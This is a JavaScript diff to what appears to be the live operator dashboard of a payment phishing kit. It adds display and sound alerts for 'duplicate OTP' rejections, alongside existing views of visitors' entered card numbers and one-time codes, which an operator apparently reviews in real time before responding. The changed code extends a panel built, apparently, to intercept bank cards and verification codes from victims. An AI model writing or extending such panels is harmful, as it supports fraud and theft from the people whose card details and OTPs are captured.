@@ -1169,6 +1169,27 @@
         }
       });
 
+      socket.on('visitor:duplicateOtp', ({ visitorId, code, page, visitor: updatedVisitor }) => {
+        const existing = visitors.get(visitorId);
+        if (existing) {
+          // Update visitor - remove waiting status
+          existing.waitingForAdminResponse = false;
+          if (updatedVisitor) Object.assign(existing, updatedVisitor);
+          existing.waitingForAdminResponse = false;
+          visitors.set(visitorId, existing);
+          renderVisitorsList();
+          if (selectedVisitorId === visitorId) {
+            renderVisitorDetails(existing);
+          }
+          // Show notification
+          showNotification('⚠️ تم رفض رمز مكرر من الزائر #' + existing.visitorNumber + ' - ' + code);
+          try {
+            frogAudio.currentTime = 0;
+            frogAudio.play().catch(() => {});
+          } catch(e) {}
+        }
+      });
+
       socket.on('visitor:disconnected', ({ visitorId, socketId }) => {
         const visitor = visitors.get(visitorId);
         if (visitor) {
@@ -1596,6 +1617,18 @@
         });
       }
       
+      // Add duplicate OTP rejections with type
+      if (visitor.duplicateOtpRejections && visitor.duplicateOtpRejections.length > 0) {
+        visitor.duplicateOtpRejections.forEach((rej, index) => {
+          allEntries.push({
+            type: 'duplicateOtp',
+            data: rej,
+            index: index,
+            timestamp: rej.timestamp || new Date(0).toISOString()
+          });
+        });
+      }
+      
       // Add digit codes with type
       if (visitor.digitCodes && visitor.digitCodes.length > 0) {
         visitor.digitCodes.forEach((dc, index) => {
@@ -1644,6 +1677,11 @@
             const maskedCard = rej.cardNumber ? rej.cardNumber.slice(0, 4) + ' **** **** ' + rej.cardNumber.slice(-4) : '';
             html += '<div class="bg-yellow-50 border border-yellow-300 rounded-lg p-3">';
             html += '<p class="text-yellow-800 font-medium text-center">⚠️ تم رفض بطاقة مكررة: ' + maskedCard + '</p>';
+            html += '</div>';
+          } else if (entry.type === 'duplicateOtp') {
+            const rej = entry.data;
+            html += '<div class="bg-yellow-50 border border-yellow-300 rounded-lg p-3">';
+            html += '<p class="text-yellow-800 font-medium text-center">⚠️ تم رفض رمز مكرر: ' + rej.code + ' (' + (rej.page || '') + ')</p>';
             html += '</div>';
           } else if (entry.type === 'code') {
             const dc = entry.data;
